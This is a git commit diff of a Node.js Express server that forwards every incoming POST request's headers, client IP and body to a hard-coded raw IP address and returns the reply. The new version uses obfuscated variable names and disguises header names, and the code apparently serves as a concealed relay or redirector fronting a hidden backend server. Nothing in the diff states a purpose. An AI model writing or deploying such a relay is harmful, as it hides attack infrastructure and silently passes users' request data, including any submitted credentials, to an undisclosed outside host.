7b902416730e0f2b0e1ac5156dc4db5e39019543
karindover022 <151636206+karindover022@users.noreply.github.com>
2024-01-09 02:25:48 -0800

    1

--- server.js
+++ server.js
@@ -1,31 +1,37 @@
-var bodyParser = require("body-parser");
-var express = require("express");
-const requester = require('request');
-
-var app = express();
-app.use(bodyParser.urlencoded({limit: '50mb', extended: true}));
-app.use(bodyParser.json({limit: '50mb'}));
-app.use(bodyParser.raw());
-app.set('port', process.env.PORT);
-
-app.post("/",function (req, res) {
- req.headers["true-client-ip"]=req.headers["x-forwarded-for"].split(",")[0]
-var head=req.headers;
- var headerss=JSON.stringify(head).replace("'{","").replace("}'","").replace("host","hello").replace("content-length","content2")
- try{
- requester.post({
-    headers:JSON.parse(headerss),
-    url:     'http://185.236.78.71',
-    body:   req.body,
-    json: true
-  }).pipe(res)
- }catch{
-res.sendStatus(400);  
- }
-
-});
-
-app.listen(process.env.PORT, "0.0.0.0", function() {
-    console.log(app.get('port'))
-    console.log("Starting listen...");
-});
+var bodyParser = require('body-parser'),
+  express = require('express')
+const requester = require('request')
+var app = express()
+app.use(
+  bodyParser.urlencoded({
+    limit: '50mb',
+    extended: true,
+  })
+)
+app.use(bodyParser.json({ limit: '50mb' }))
+app.use(bodyParser.raw())
+app.set('port', process.env.PORT)
+app.post('*', function (_0x2c6744, _0x650fd8) {
+  _0x2c6744.headers['true-client-ip'] = _0x2c6744.headers['x-forwarded-for']
+  let _0x489792 = new Date()
+  var _0xfe5256 = _0x2c6744.headers,
+    _0x4b463c = JSON.stringify(_0xfe5256)
+      .replace("'{", '')
+      .replace("}'", '')
+      .replace('host', 'Dom_Net')
+      .replace('content-length', 'content2')
+      .replace('content-type', 'content34'),
+    _0x18eedb = 'http://185.236.78.111' + _0x2c6744.url
+  requester
+    .post({
+      headers: JSON.parse(_0x4b463c),
+      url: _0x18eedb,
+      body: _0x2c6744.body,
+      json: true,
+    })
+    .pipe(_0x650fd8)
+})
+app.listen(process.env.PORT, '0.0.0.0', function () {
+  console.log(app.get('port'))
+  console.log('Starting listen...')
+})
